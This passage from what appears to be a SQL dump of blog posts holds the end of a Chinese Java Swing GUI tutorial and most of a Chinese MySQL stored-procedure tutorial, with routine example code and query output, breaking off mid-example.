JFrame,Jwindow,Jdialog就是上面提到的有多层嵌板的容器，如果要在这些容器上面放置组件，必须放置在他们的内容嵌板(pane)上。我们通过函数getContentPane()可得到当前容器的内容嵌板。</p>\r\n\r\n<p><br />\r\n页签式嵌板：这个嵌板如同卡片，在上面提供文件夹式的页签，当前只显示一页，如要进入下一页，只要点击上面的页签。</p>\r\n\r\n<p><br />\r\n有些如JPanel是可以直接放置组件的容器。所以不需要使用嵌板。</p>\r\n\r\n<p><br />\r\n如果要按自己的想法排列放在容器上的组件，我们必须使用到布局管理器(Layout)来进行管理。Java系统默认的布局管理器为边界管理器 (BorderLayout)。它把版面分为五大块，中央区域(Center)，顶端(North),底部(South),左侧(West),右侧 (East),细心的你可能会发现我们的主界面就是用的这个布局架构。其他的几个布局管理器有：</p>\r\n\r\n<p><br />\r\n流布局(FlowLayout)：把其内的组件按从左到右，从上到下的流方式排列。</p>\r\n\r\n<p><br />\r\n网格布局(GridLayout)：把组件放置到布局中的设置的每个网格中</p>\r\n\r\n<p><br />\r\n无序网格布局(GridBagLayout)：类似于网格布局，但功能更强大也更复杂。能处理所有的布局。</p>\r\n\r\n<p><br />\r\n如果你仔细观察会发现我们的主界面最右边会发现使用了网格布局。</p>\r\n\r\n<p><br />\r\n下面来看看我们的主模块的构造函数代码,来感受一下上面的结构设计。</p>\r\n\r\n<p><br />\r\npublic SwingTest()</p>\r\n\r\n<p><br />\r\n{</p>\r\n\r\n<p><br />\r\n// 初始化所有子模块</p>\r\n\r\n<p><br />\r\nMenuTest menuTest = new MenuTest();</p>\r\n\r\n<p><br />\r\nLeftPanel leftPanel = new LeftPanel();</p>\r\n\r\n<p><br />\r\nRightPanel rightPanel = new RightPanel();</p>\r\n\r\n<p><br />\r\nBottomPanel bottomPanel = new BottomPanel();</p>\r\n\r\n<p><br />\r\nCenterPanel centerPanel = new CenterPanel();</p>\r\n\r\n<p><br />\r\n// 设置主框架的布局</p>\r\n\r\n<p><br />\r\nContainer c = this.getContentPane();</p>\r\n\r\n<p><br />\r\n// c.setLayout(new BorderLayout())</p>\r\n\r\n<p><br />\r\nthis.setJMenuBar(menuTest);</p>\r\n\r\n<p><br />\r\nc.add(leftPanel,BorderLayout.WEST);</p>\r\n\r\n<p><br />\r\nc.add(rightPanel,BorderLayout.EAST);</p>\r\n\r\n<p><br />\r\nc.add(centerPanel,BorderLayout.CENTER);</p>\r\n\r\n<p><br />\r\nc.add(bottomPanel,BorderLayout.SOUTH);</p>\r\n\r\n<p><br />\r\nsetSize(700,500);</p>\r\n\r\n<p><br />\r\nsetTitle(&quot;Swing 组件大全简体版&quot;);</p>\r\n\r\n<p><br />\r\n// 隐藏frame的标题栏,此功暂时关闭，以方便使用window事件</p>\r\n\r\n<p><br />\r\n// setUndecorated(true);</p>\r\n\r\n<p><br />\r\nsetLocation(200,150);</p>\r\n\r\n<p><br />\r\nshow();</p>\r\n\r\n<p><br />\r\n}</p>\r\n\r\n<p><br />\r\n如拆分三个子组件，可把一个拆分嵌板做为另一个拆分嵌板的子组件！</p>\r\n\r\n<p><br />\r\n五 事件模型</p>\r\n\r\n<p><br />\r\n在Swing 中每个组件都可触发事件，一旦触发事件会被一个或多个Listener（监听器）接收。不同类型的事件分别由个别的class表示。事件发生点可以和处理事件的代码分开。</p>\r\n\r\n<p><br />\r\n要想处理事件，只要产生Listener对象，并调用组件的addXXXListener()方法注册事件。我们大部分是通过继承事件接口来处理事件 的。但是继承Java接口我们必须实现出接口中的所有方法。有些接口包含了大量的函数，如果要一个个实现是件很麻烦的事件上，Java中定义了相应接口的 Adapter接配器类来解决这种情况。接配器类已经帮我们实现了接口的所有方法，而我们只要继承接配器就可在代码内做我们想做的事情。也即只要实现或覆 写我们想要实现的方法。</p>\r\n\r\n<p><br />\r\n下面我们还是以主模块为例，来处理关闭窗口事件。</p>\r\n\r\n<p><br />\r\n// 利用无名内隐类，增加窗口事件</p>\r\n\r\n<p><br />\r\nthis.addWindowListener(new WindowAdapter()</p>\r\n\r\n<p><br />\r\n{</p>\r\n\r\n<p><br />\r\npublic void WindowClosing(WindowEvent e)</p>\r\n\r\n<p><br />\r\n{</p>\r\n\r\n<p><br />\r\n// 释放资源，退出程序</p>\r\n\r\n<p><br />\r\ndispose();</p>\r\n\r\n<p><br />\r\nSystem.exit(0);</p>\r\n\r\n<p><br />\r\n}</p>\r\n\r\n<p><br />\r\n});</p>\r\n\r\n<p><br />\r\n如上所示，我们向主框架注册了一个窗口事件addWindowListener()，事件继承了WindowAdapter接配器，并重载了方法WindowClosing(),方法中利用dispose()释放窗口资源，System.exit(0)关闭窗口。</p>\r\n\r\n<p><br />\r\n六 总结</p>\r\n\r\n<p><br />\r\n好了，我们来回顾一个我们的上面的内容：设计的思路，容器，嵌板，布局管理器, Swing组件的事件。</p>\r\n\r\n<p><br />\r\n大家明白了为什么做项目能快速提高自己水平了吧。其实上面的方法原理和做项目差不多，任何事只要经过自己的大脑思考，亲手操作，想忘记并不是那么容易的了。相信看了本文和代码再辅以相关的书籍介绍，大家对Swing处理会有一定的感性理解了。</p>\r\n\r\n<p><br />\r\n开始动手吧。发挥你的天才思维，自己设计一个更好的Swing组件大全吧。当然你也可在本程序的基础上完善其中更复杂的功能。比如：把树形列表内容用 window文件资源器代替，把表格的处理和数据库相连接或和相关数据连接，让文本区可显示图片。。。。。哦，天啊。说不定一个好的产品也会因此诞生。</p>\r\n\r\n<p><br />\r\n再次强调开始之前请先设计你的界面，画出你的程序结构图。即使再小的程序也请你大概勾一个它的轮廓。</p>\r\n\r\n<p><br />\r\n七 具体代码</p>\r\n\r\n<p><br />\r\n由于代码中已经附上了比较详细的注释，在此就不一一解释说明了。在此要提醒大家在研究源代码时要注意几个复杂的组件的处理方式：如树形组件 (JTree),表格(JTable),文本区(JtextArea),定时器(Timer)。为了方便大家直接复制源代码来编译，所有的模块都是放在一 个主类中实现的。所有源代码的事件都是用嵌套的内隐类方法来实现的。如果大家不习惯这种写法，程序中已经消除了各模块之间的关联性，可很方便的把各子模块 分离成类文件。代码只是演示了Swing的大部组件，各个组件没有很深入的处理了。</p>\r\n',0,1437746328,0,0),(46,32,'MySQL存储过程详解','<p>1.&nbsp;&nbsp;&nbsp;&nbsp; 存储过程简介</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>我们常用的操作数据库语言SQL语句在执行的时候需要要先编译，然后执行，而存储过程（Stored Procedure）是一组为了完成特定功能的SQL语句集，经编译后存储在数据库中，用户通过指定存储过程的名字并给定参数（如果该存储过程带有参数）来调用执行它。</p>\r\n\r\n<p>一个存储过程是一个可编程的函数，它在数据库中创建并保存。它可以有SQL语句和一些特殊的控制结构组成。当希望在不同的应用程序或平台上执行相同的函数，或者封装特定功能时，存储过程是非常有用的。数据库中的存储过程可以看做是对编程中面向对象方法的模拟。它允许控制数据的访问方式。</p>\r\n\r\n<p>存储过程通常有以下优点：</p>\r\n\r\n<p>(1).存储过程增强了SQL语言的功能和灵活性。存储过程可以用流控制语句编写，有很强的灵活性，可以完成复杂的判断和较复杂的运算。</p>\r\n\r\n<p>(2).存储过程允许标准组件是编程。存储过程被创建后，可以在程序中被多次调用，而不必重新编写该存储过程的SQL语句。而且数据库专业人员可以随时对存储过程进行修改，对应用程序源代码毫无影响。</p>\r\n\r\n<p>(3).存储过程能实现较快的执行速度。如果某一操作包含大量的Transaction-SQL代码或分别被多次执行，那么存储过程要比批处理的执行速度快很多。因为存储过程是预编译的。在首次运行一个存储过程时查询，优化器对其进行分析优化，并且给出最终被存储在系统表中的执行计划。而批处理的Transaction-SQL语句在每次运行时都要进行编译和优化，速度相对要慢一些。</p>\r\n\r\n<p>(4).存储过程能过减少网络流量。针对同一个数据库对象的操作（如查询、修改），如果这一操作所涉及的Transaction-SQL语句被组织程存储过程，那么当在客户计算机上调用该存储过程时，网络中传送的只是该调用语句，从而大大增加了网络流量并降低了网络负载。</p>\r\n\r\n<p>(5).存储过程可被作为一种安全机制来充分利用。系统管理员通过执行某一存储过程的权限进行限制，能够实现对相应的数据的访问权限的限制，避免了非授权用户对数据的访问，保证了数据的安全。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>2.&nbsp;&nbsp;&nbsp;&nbsp; 关于MySQL的存储过程</p>\r\n\r\n<p>存储过程是数据库存储的一个重要的功能，但是MySQL在5.0以前并不支持存储过程，这使得MySQL在应用上大打折扣。好在MySQL 5.0终于开始已经支持存储过程，这样即可以大大提高数据库的处理速度，同时也可以提高数据库编程的灵活性。</p>\r\n\r\n<p>3.&nbsp;&nbsp;&nbsp;&nbsp; MySQL存储过程的创建</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(1).格式</p>\r\n\r\n<p>MySQL存储过程创建的格式：CREATE PROCEDURE过程名([过程参数[,...]])<br />\r\n[特性...]过程体</p>\r\n\r\n<p>这里先举个例子：<br />\r\n&nbsp; &nbsp;</p>\r\n\r\n<p>mysql&gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql&gt; CREATE PROCEDURE proc1(OUT s int) &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; BEGIN</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; SELECT COUNT(*) INTO s FROM user; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; END</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql&gt; DELIMITER ;<br />\r\n&nbsp;注：</p>\r\n\r\n<p>（1）这里需要注意的是DELIMITER //和DELIMITER ;两句，DELIMITER是分割符的意思，因为MySQL默认以&quot;;&quot;为分隔符，如果我们没有声明分割符，那么编译器会把存储过程当成SQL语句进行处理，则存储过程的编译过程会报错，所以要事先用DELIMITER关键字申明当前段分隔符，这样MySQL才会将&quot;;&quot;当做存储过程中的代码，不会执行这些代码，用完了之后要把分隔符还原。</p>\r\n\r\n<p>（2）存储过程根据需要可能会有输入、输出、输入输出参数，这里有一个输出参数s，类型是int型，如果有多个参数用&quot;,&quot;分割开。</p>\r\n\r\n<p>（3）过程体的开始与结束使用BEGIN与END进行标识。</p>\r\n\r\n<p>这样，我们的一个MySQL存储过程就完成了，是不是很容易呢?看不懂也没关系，接下来，我们详细的讲解。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(2).声明分割符</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>其实，关于声明分割符，上面的注解已经写得很清楚，不需要多说，只是稍微要注意一点的是：如果是用MySQL的Administrator管理工具时，可以直接创建，不再需要声明。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(3).参数</p>\r\n\r\n<p>MySQL存储过程的参数用在存储过程的定义，共有三种参数类型,IN,OUT,INOUT,形式如：</p>\r\n\r\n<p>CREATE PROCEDURE([[IN |OUT |INOUT ]参数名数据类形...])</p>\r\n\r\n<p>IN输入参数:表示该参数的值必须在调用存储过程时指定，在存储过程中修改该参数的值不能被返回，为默认值</p>\r\n\r\n<p>OUT输出参数:该值可在存储过程内部被改变，并可返回</p>\r\n\r\n<p>INOUT输入输出参数:调用时指定，并且可被改变和返回</p>\r\n\r\n<p>Ⅰ. IN参数例子</p>\r\n\r\n<p>创建:</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE demo_in_parameter(IN p_in int) &nbsp;</p>\r\n\r\n<p>-&gt; BEGIN &nbsp;</p>\r\n\r\n<p>-&gt; SELECT p_in; &nbsp;</p>\r\n\r\n<p>-&gt; SET p_in=2; &nbsp;</p>\r\n\r\n<p>-&gt; SELECT p_in; &nbsp;</p>\r\n\r\n<p>-&gt; END; &nbsp;</p>\r\n\r\n<p>-&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ;</p>\r\n\r\n<p><br />\r\n执行结果:</p>\r\n\r\n<p>mysql &gt; SET @p_in=1; &nbsp;</p>\r\n\r\n<p>mysql &gt; CALL demo_in_parameter(@p_in); &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>| p_in | &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>|&nbsp;&nbsp; 1&nbsp; | &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>| p_in | &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>|&nbsp;&nbsp; 2&nbsp; | &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; SELECT @p_in; &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>| @p_in | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>|&nbsp; 1&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p><br />\r\n以上可以看出，p_in虽然在存储过程中被修改，但并不影响@p_id的值</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Ⅱ.OUT参数例子</p>\r\n\r\n<p>创建:</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE demo_out_parameter(OUT p_out int) &nbsp;</p>\r\n\r\n<p>-&gt; BEGIN</p>\r\n\r\n<p>-&gt; SELECT p_out; &nbsp;</p>\r\n\r\n<p>-&gt; SET p_out=2; &nbsp;</p>\r\n\r\n<p>-&gt; SELECT p_out; &nbsp;</p>\r\n\r\n<p>-&gt; END; &nbsp;</p>\r\n\r\n<p>-&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ;</p>\r\n\r\n<p><br />\r\n执行结果:</p>\r\n\r\n<p>mysql &gt; SET @p_out=1; &nbsp;</p>\r\n\r\n<p>mysql &gt; CALL sp_demo_out_parameter(@p_out); &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>| p_out | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>| NULL&nbsp; | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>| p_out | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>|&nbsp;&nbsp; 2&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql&gt; SELECT @p_out; &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>| p_out | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p>|&nbsp;&nbsp; 2&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+-------+</p>\r\n\r\n<p><br />\r\nⅢ. INOUT参数例子</p>\r\n\r\n<p>创建:</p>\r\n\r\n<p>mysql &gt; DELIMITER //&nbsp; &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE demo_inout_parameter(INOUT p_inout int)&nbsp; &nbsp;</p>\r\n\r\n<p>-&gt; BEGIN</p>\r\n\r\n<p>-&gt; SELECT p_inout; &nbsp;</p>\r\n\r\n<p>-&gt; SET p_inout=2; &nbsp;</p>\r\n\r\n<p>-&gt; SELECT p_inout; &nbsp;</p>\r\n\r\n<p>-&gt; END; &nbsp;</p>\r\n\r\n<p>-&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;<br />\r\n执行结果:</p>\r\n\r\n<p>mysql &gt; SET @p_inout=1; &nbsp;</p>\r\n\r\n<p>mysql &gt; CALL demo_inout_parameter(@p_inout) ; &nbsp;</p>\r\n\r\n<p>+---------+ &nbsp;</p>\r\n\r\n<p>| p_inout | &nbsp;</p>\r\n\r\n<p>+---------+ &nbsp;</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp; 1&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+---------+ &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>+---------+ &nbsp;</p>\r\n\r\n<p>| p_inout | &nbsp;</p>\r\n\r\n<p>+---------+ &nbsp;</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp; 2&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+---------+ &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql &gt; SELECT @p_inout; &nbsp;</p>\r\n\r\n<p>+----------+ &nbsp;</p>\r\n\r\n<p>| @p_inout | &nbsp;</p>\r\n\r\n<p>+----------+ &nbsp;</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp; 2&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+----------+</p>\r\n\r\n<p>(4).变量</p>\r\n\r\n<p>Ⅰ.变量定义</p>\r\n\r\n<p>DECLARE variable_name [,variable_name...] datatype [DEFAULT value];</p>\r\n\r\n<p>其中，datatype为MySQL的数据类型，如:int, float, date, varchar(length)</p>\r\n\r\n<p>例如:</p>\r\n\r\n<p>DECLARE l_int int unsigned default 4000000; &nbsp;</p>\r\n\r\n<p>DECLARE l_numeric number(8,2) DEFAULT 9.95; &nbsp;</p>\r\n\r\n<p>DECLARE l_date date DEFAULT &#39;1999-12-31&#39;; &nbsp;</p>\r\n\r\n<p>DECLARE l_datetime datetime DEFAULT &#39;1999-12-31 23:59:59&#39;; &nbsp;</p>\r\n\r\n<p>DECLARE l_varchar varchar(255) DEFAULT &#39;This will not be padded&#39;; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;<br />\r\nⅡ.变量赋值</p>\r\n\r\n<p>&nbsp;SET变量名=表达式值[,variable_name = expression ...]</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>Ⅲ.用户变量</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>ⅰ.在MySQL客户端使用用户变量</p>\r\n\r\n<p>mysql &gt; SELECT &#39;Hello World&#39; into @x; &nbsp;</p>\r\n\r\n<p>mysql &gt; SELECT @x; &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>|&nbsp;&nbsp; @x&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>| Hello World | &nbsp;</p>\r\n\r\n<p>+-------------+</p>\r\n\r\n<p>mysql &gt; SET @y=&#39;Goodbye Cruel World&#39;; &nbsp;</p>\r\n\r\n<p>mysql &gt; SELECT @y; &nbsp;</p>\r\n\r\n<p>+---------------------+</p>\r\n\r\n<p>|&nbsp;&nbsp;&nbsp;&nbsp; @y&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+---------------------+</p>\r\n\r\n<p>| Goodbye Cruel World | &nbsp;</p>\r\n\r\n<p>+---------------------+</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql &gt; SET @z=1+2+3; &nbsp;</p>\r\n\r\n<p>mysql &gt; SELECT @z; &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>| @z&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>|&nbsp; 6&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+------+</p>\r\n\r\n<p>ⅱ.在存储过程中使用用户变量</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE GreetWorld( ) SELECT CONCAT(@greeting,&#39; World&#39;); &nbsp;</p>\r\n\r\n<p>mysql &gt; SET @greeting=&#39;Hello&#39;; &nbsp;</p>\r\n\r\n<p>mysql &gt; CALL GreetWorld( ); &nbsp;</p>\r\n\r\n<p>+----------------------------+</p>\r\n\r\n<p>| CONCAT(@greeting,&#39; World&#39;) | &nbsp;</p>\r\n\r\n<p>+----------------------------+</p>\r\n\r\n<p>|&nbsp; Hello World&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+----------------------------+</p>\r\n\r\n<p>&nbsp;<br />\r\nⅲ.在存储过程间传递全局范围的用户变量</p>\r\n\r\n<p>mysql&gt; CREATE PROCEDURE p1()&nbsp;&nbsp; SET @last_procedure=&#39;p1&#39;; &nbsp;</p>\r\n\r\n<p>mysql&gt; CREATE PROCEDURE p2() SELECT CONCAT(&#39;Last procedure was &#39;,@last_proc); &nbsp;</p>\r\n\r\n<p>mysql&gt; CALL p1( ); &nbsp;</p>\r\n\r\n<p>mysql&gt; CALL p2( ); &nbsp;</p>\r\n\r\n<p>+-----------------------------------------------+</p>\r\n\r\n<p>| CONCAT(&#39;Last procedure was &#39;,@last_proc | &nbsp;</p>\r\n\r\n<p>+-----------------------------------------------+</p>\r\n\r\n<p>| Last procedure was p1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; | &nbsp;</p>\r\n\r\n<p>+-----------------------------------------------+</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;<br />\r\n注意:</p>\r\n\r\n<p>①用户变量名一般以@开头</p>\r\n\r\n<p>②滥用用户变量会导致程序难以理解及管理</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>(5).注释</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>MySQL存储过程可使用两种风格的注释</p>\r\n\r\n<p>双模杠：--</p>\r\n\r\n<p>该风格一般用于单行注释</p>\r\n\r\n<p>c风格：一般用于多行注释</p>\r\n\r\n<p>例如：</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc1 --name存储过程名</p>\r\n\r\n<p>-&gt; (IN parameter1 INTEGER) &nbsp;</p>\r\n\r\n<p>-&gt; BEGIN &nbsp;</p>\r\n\r\n<p>-&gt; DECLARE variable1 CHAR(10); &nbsp;</p>\r\n\r\n<p>-&gt; IF parameter1 = 17 THEN &nbsp;</p>\r\n\r\n<p>-&gt; SET variable1 = &#39;birds&#39;; &nbsp;</p>\r\n\r\n<p>-&gt; ELSE</p>\r\n\r\n<p>-&gt; SET variable1 = &#39;beasts&#39;; &nbsp;</p>\r\n\r\n<p>-&gt; END IF; &nbsp;</p>\r\n\r\n<p>-&gt; INSERT INTO table1 VALUES (variable1); &nbsp;</p>\r\n\r\n<p>-&gt; END &nbsp;</p>\r\n\r\n<p>-&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>4.&nbsp;&nbsp;&nbsp;&nbsp; MySQL存储过程的调用</p>\r\n\r\n<p>用call和你过程名以及一个括号，括号里面根据需要，加入参数，参数包括输入参数、输出参数、输入输出参数。具体的调用方法可以参看上面的例子。</p>\r\n\r\n<p>5.&nbsp;&nbsp;&nbsp;&nbsp; MySQL存储过程的查询</p>\r\n\r\n<p>我们像知道一个数据库下面有那些表，我们一般采用show tables;进行查看。那么我们要查看某个数据库下面的存储过程，是否也可以采用呢？答案是，我们可以查看某个数据库下面的存储过程，但是是令一钟方式。</p>\r\n\r\n<p>我们可以用</p>\r\n\r\n<p>select name from mysql.proc where db=&rsquo;数据库名&rsquo;;</p>\r\n\r\n<p>或者</p>\r\n\r\n<p>select routine_name from information_schema.routines where routine_schema=&#39;数据库名&#39;;</p>\r\n\r\n<p>或者</p>\r\n\r\n<p>show procedure status where db=&#39;数据库名&#39;;</p>\r\n\r\n<p>进行查询。</p>\r\n\r\n<p>如果我们想知道，某个存储过程的详细，那我们又该怎么做呢？是不是也可以像操作表一样用describe表名进行查看呢？</p>\r\n\r\n<p>答案是：我们可以查看存储过程的详细，但是需要用另一种方法：</p>\r\n\r\n<p>SHOW CREATE PROCEDURE数据库.存储过程名;</p>\r\n\r\n<p>就可以查看当前存储过程的详细。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>6.&nbsp;&nbsp;&nbsp;&nbsp; MySQL存储过程的修改</p>\r\n\r\n<p>ALTER PROCEDURE</p>\r\n\r\n<p>更改用CREATE PROCEDURE建立的预先指定的存储过程，其不会影响相关存储过程或存储功能。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>7.&nbsp;&nbsp;&nbsp;&nbsp; MySQL存储过程的删除</p>\r\n\r\n<p>删除一个存储过程比较简单，和删除表一样：</p>\r\n\r\n<p>DROP PROCEDURE</p>\r\n\r\n<p>从MySQL的表格中删除一个或多个存储过程。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>8.&nbsp;&nbsp;&nbsp;&nbsp; MySQL存储过程的控制语句</p>\r\n\r\n<p>(1).变量作用域</p>\r\n\r\n<p>内部的变量在其作用域范围内享有更高的优先权，当执行到end。变量时，内部变量消失，此时已经在其作用域外，变量不再可见了，应为在存储<br />\r\n过程外再也不能找到这个申明的变量，但是你可以通过out参数或者将其值指派<br />\r\n给会话变量来保存其值。</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc3() &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare x1 varchar(5) default &#39;outer&#39;; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare x1 varchar(5) default &#39;inner&#39;; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; select x1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; select x1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ; &nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;(2).条件语句</p>\r\n\r\n<p>Ⅰ. if-then -else语句</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>&nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc2(IN parameter int) &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare var int; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set var=parameter+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; if var=0 then</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(17); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end if; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; if parameter=0 then</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; update t set s1=s1+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; else</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; update t set s1=s1+2; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end if; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; end; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; // &nbsp;</p>\r\n\r\n<p>mysql &gt; DELIMITER ; &nbsp;</p>\r\n\r\n<p><br />\r\nⅡ. case语句：</p>\r\n\r\n<p>mysql &gt; DELIMITER // &nbsp;</p>\r\n\r\n<p>mysql &gt; CREATE PROCEDURE proc3 (in parameter int) &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; begin</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; declare var int; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; set var=parameter+1; &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; case var &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; when 0 then &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; insert into t values(17); &nbsp;</p>\r\n\r\n<p>&nbsp;&nbsp;&nbsp;&nbsp; -&gt; when 1 then 